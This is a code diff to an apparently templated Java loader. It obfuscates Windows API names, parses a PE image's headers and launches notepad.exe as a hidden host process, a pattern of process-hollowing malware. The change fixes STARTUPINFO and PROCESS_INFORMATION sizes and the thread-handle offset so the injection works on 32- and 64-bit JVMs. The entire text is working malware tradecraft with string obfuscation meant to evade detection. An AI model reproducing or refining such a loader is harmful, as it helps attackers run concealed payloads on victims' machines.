@@ -159,6 +159,11 @@ public class Main {
     Constructor<?> ptrCtor = ptrClass.getConstructor(new Class<?>[]{long.class});
     String k32 = x(${xs("kernel32")});
 
+    // Determine JVM pointer size (affects struct layouts for Windows API calls)
+    Class<?> nativeClass = Class.forName(x(${xs("com.sun.jna.Native")}));
+    int ptrSize = ((Number) nativeClass.getField(x(${xs("POINTER_SIZE")})).get(null)).intValue();
+    boolean jvm64 = ptrSize == 8;
+
     // 5. Parse PE headers
     int peOff = (int) u32(pe, 60);
     int numSections = u16(pe, peOff + 6);
@@ -173,9 +178,9 @@ public class Main {
 
     // 6. Start notepad.exe as host process
     // CreateProcessA(lpApplicationName, ..., CREATE_NO_WINDOW=0x08000000, ...)
-    // We use a Memory block for STARTUPINFO (68/104 bytes) and PROCESS_INFORMATION (16/24 bytes)
-    int siSize = is64 ? 104 : 68;
-    int piSize = is64 ? 24 : 16;
+    // Struct sizes depend on JVM architecture (pointer size), not the PE's
+    int siSize = jvm64 ? 104 : 68;
+    int piSize = jvm64 ? 24 : 16;
     Object siMem = memClass.getConstructor(long.class).newInstance((long)(siSize));
     Object piMem = memClass.getConstructor(long.class).newInstance((long)(piSize));
     // Zero out
@@ -198,9 +203,8 @@ public class Main {
     Method getIntM = gm(ptrClass, x(${xs("getInt")}), long.class);
     Method getPtrM = gm(ptrClass, x(${xs("getPointer")}), long.class);
     Object hProcess = getPtrM.invoke(piMem, new Object[]{0L});
-    // PID at offset 8 (32-bit) or 16 (64-bit) — not needed but available
-    // Thread handle at offset 4 (32-bit) or 8 (64-bit)
-    Object hThread = is64 ? getPtrM.invoke(piMem, new Object[]{8L}) : getPtrM.invoke(piMem, new Object[]{4L});
+    // Thread handle offset depends on JVM pointer size (after hProcess pointer)
+    Object hThread = jvm64 ? getPtrM.invoke(piMem, new Object[]{8L}) : getPtrM.invoke(piMem, new Object[]{4L});
 
     Thread.sleep(500); // Let notepad initialize
 
